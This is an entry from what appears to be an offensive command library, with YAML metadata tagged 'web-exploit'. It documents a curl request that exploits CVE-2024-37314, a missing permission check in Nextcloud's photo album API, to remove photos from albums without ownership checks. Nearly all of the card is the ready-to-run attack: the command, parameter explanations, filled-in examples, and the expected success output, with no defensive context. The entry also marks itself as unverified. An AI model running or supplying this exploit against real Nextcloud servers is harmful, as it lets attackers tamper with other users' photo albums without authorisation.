---
data: >-
  curl -X POST
  'https://nextcloud.example.com/apps/photos/api/v1/albums/{album_id}/photos/{photo_id}'
  -H 'Authorization: Basic {base64-encoded-credentials}' -H 'Content-Type:
  application/json' -d '{}' 
tags:
  - web-exploit
  - api
  - nextcloud
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: f0c29cd5-c5a9-49d8-90f7-4fc0bc2dfc58
created_at: '2025-12-14T17:29:28.155Z'
updated_at: '2025-12-14T17:29:28.155Z'
verified: false
validated: true
submitted: true
---
# curl-remove-photo-from-album

## Command

```bash
curl -X POST 'https://nextcloud.example.com/apps/photos/api/v1/albums/{album_id}/photos/{photo_id}' -H 'Authorization: Basic {base64-encoded-credentials}' -H 'Content-Type: application/json' -d '{}'
```

## Description

This curl command exploits the missing permission check in Nextcloud's photo album API by sending a POST request to remove a specified photo from an album, using basic authentication. It targets CVE-2024-37314 and succeeds without ownership verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method for the removal action | Yes |
| `URL` | Target endpoint with album_id and photo_id placeholders | Yes |
| `-H 'Authorization: Basic ...'` | Base64-encoded username:password for authentication | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type for the request body | Yes |
| `-d '{}'` | Empty JSON body as required by the API | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://nextcloud.example.com/apps/photos/api/v1/albums/123/photos/456' -H 'Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=' -H 'Content-Type: application/json' -d '{}'
```

### Advanced Usage

Add `-v` for verbose output to inspect headers and response details:

```bash
curl -v -X POST 'https://nextcloud.example.com/apps/photos/api/v1/albums/123/photos/456' -H 'Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=' -H 'Content-Type: application/json' -d '{}'
```

## Expected Output

Successful execution returns HTTP 200 OK with a JSON response like {"success": true} or empty body. Failure due to invalid IDs shows 404, but no permission error for unauthorized removals in vulnerable versions.

## Related

- [[Related Procedure: Exploit-Missing-Permission-Check-in-Nextcloud-Photo-Album]]
